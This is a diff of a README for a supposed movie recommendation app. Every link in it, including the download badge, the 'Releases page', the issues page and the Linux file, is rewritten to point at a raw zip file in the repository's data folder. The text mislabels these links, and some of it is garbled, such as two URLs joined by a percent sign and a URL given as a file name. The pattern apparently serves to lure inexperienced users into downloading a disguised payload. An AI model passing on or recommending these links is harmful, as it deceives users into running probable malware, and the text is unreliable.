@@ -1,7 +1,7 @@
 # 🎬 Movie_Recommended_System - Get Movie Suggestions Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip%https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip)](https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip)
+[![Download](https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip%https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip)](https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip)
 
 ## 🚀 Getting Started
 Movie_Recommended_System helps you find movies you’ll love. This guide will help you download and run the application, even if you have no technical background.
@@ -18,14 +18,14 @@ Before you start, ensure your computer meets these requirements:
 To get started, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download the Movie_Recommended_System](https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip)
+   [Download the Movie_Recommended_System](https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip)
 
 2. Once on the Releases page, look for the latest version of the application.
 
 3. Click on the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip` file.
+   - For **Linux**, download the `https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip` file.
 
 4. After the download completes, locate the downloaded file on your computer.
 
@@ -60,9 +60,9 @@ Yes, an internet connection is required to fetch live movie data and provide rec
 Absolutely. You can uninstall the Movie_Recommended_System like any other application on your computer. Go to the control panel (Windows) or drag the app to the trash (macOS) to remove it.
 
 ## 🤝 Support
-If you encounter any issues or have questions, feel free to reach out for help. You can create an issue on our [GitHub page](https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip).
+If you encounter any issues or have questions, feel free to reach out for help. You can create an issue on our [GitHub page](https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip).
 
-For more updates, check the [Releases page](https://raw.githubusercontent.com/nevesin/Movie_Recommended_System/main/data/Movie-Recommended-System-2.7.zip).
+For more updates, check the [Releases page](https://github.com/nevesin/Movie_Recommended_System/raw/refs/heads/main/data/Recommended-System-Movie-melodizer.zip).
 
 ## 📈 Contributing
 We welcome contributions! If you’d like to help improve the application, follow these steps:
